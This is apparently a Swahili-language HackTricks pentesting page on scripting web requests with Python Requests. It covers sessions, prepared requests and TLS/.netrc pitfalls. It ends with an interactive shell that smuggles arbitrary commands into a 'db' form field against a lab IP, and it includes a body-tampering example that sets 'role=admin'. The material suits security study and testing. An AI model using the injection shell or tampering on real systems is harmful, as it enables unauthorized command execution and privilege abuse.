# Maombi ya Wavuti

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Mifano hii hutumia hoja za request zilizoandikwa za Requests, sifa za response, tuples za faili za multipart, na sessions.<sup>[[1]](#references)</sup> Mifano ya `verify=False` huzima uthibitishaji wa certificate ya TLS na inapaswa kutumika tu katika testing inayodhibitiwa.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Requests zilizoandaliwa kwa udhibiti wa payload

`PreparedRequest` huonyesha URL ya mwisho, headers na body iliyosimbwa kabla ya kutumwa. Iunde kwa `Session.prepare_request()` (badala ya `Request.prepare()`) wakati cookies au authentication za session lazima zitumike; wakati mchakato wa prepared lazima pia uzingatie mipangilio ya proxy/CA ya mazingira, iunganishe wazi kwa `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Hii ni muhimu wakati exploit inahitaji encoding isiyo ya kawaida au wakati wa kulinganisha payload iliyoundwa na request iliyohifadhiwa katika `response.request`. Si primitive ya raw-HTTP: Requests huhifadhi headers katika mapping isiyojali tofauti za herufi, kwa hiyo kugawa jina lililorudiwa hubadilisha thamani ya awali. Tumia mtumaji wa kiwango cha chini kwa mistari ya request iliyoharibika au fields tofauti zinazorudiwa za `Content-Length`/`Transfer-Encoding` zinazohitajika na [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Kutenganisha session, credentials zisizo dhahiri na hali ya TLS

Session huamini usanidi wa mazingira kwa chaguo-msingi. Ikiwa hakuna authentication iliyoainishwa wazi, Requests inaweza kupata credentials za Basic kutoka `.netrc`; inaweza pia kuleta usanidi wa proxy na paths za CA bundle kutoka kwa environment variables. Kwa scripts zinazofetch URLs zinazodhibitiwa na mshambuliaji, zima inputs hizo zisizo dhahiri na usanidi proxy/CA ya lab inayokusudiwa pekee. Releases za kabla ya 2.32.4 zingeweza kuchagua credentials za `.netrc` za host isiyo sahihi ilipopewa URL iliyoundwa kwa nia hasidi, huku `Session.trust_env = False` ikiwa workaround iliyoandikwa wakati upgrade haiwezekani.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Weka session inayotumia `verify=False` tofauti na sessions zinazohitaji TLS iliyothibitishwa. Katika Requests kabla ya 2.32.0, connection iliyofunguliwa kwanza kwa `verify=False` ingeweza kutumiwa tena kwa requests za baadaye za same-origin hata requests hizo zilipotaja `verify=True`; kusasisha hurekebisha tatizo hilo la hali ya pool, lakini isolation pia hurahisisha kukagua exploit scripts.<sup>[[5]](#references)</sup>

## Mizunguko ya exploit ya kuaminika

Requests haina timeout ya default. Timeout ya `(connect, read)` si deadline ya jumla ya wall-clock: sehemu ya read huweka kikomo cha muda ambao client husubiri kati ya bytes zilizopokelewa. Zima redirects za kiotomatiki wakati target inadhibiti `Location`, kisha validate kila hop kabla ya kutuma request mpya; redirects zikiwashwa, kagua `response.history`. Kwa responses kubwa au zenye madhara, tumia `stream=True`, itereta kwa chunks zenye ukubwa uliowekewa kikomo, na funga response kwa context manager ili connection ya pool iachiliwe.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python cmd ya kutumia RCE

Mzunguko wa command ni subclass ya Python's `Cmd`; method yake ya `default` hushughulikia command prefixes zisizotambuliwa, `cmdloop` husambaza input lines, na `re.DOTALL` huruhusu extraction pattern kuvuka newlines.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Kiolesura cha Msanidi cha Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Usaidizi wa watafsiri wa amri unaotegemea mistari](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Uendeshaji wa regular expressions](https://docs.python.org/3/library/re.html)
- [4] [Requests iko katika hatari ya kuvuja kwa credentials za `.netrc` kupitia URLs hasidi](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Object ya Requests `Session` haihakiki requests baada ya kufanya request ya kwanza kwa `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
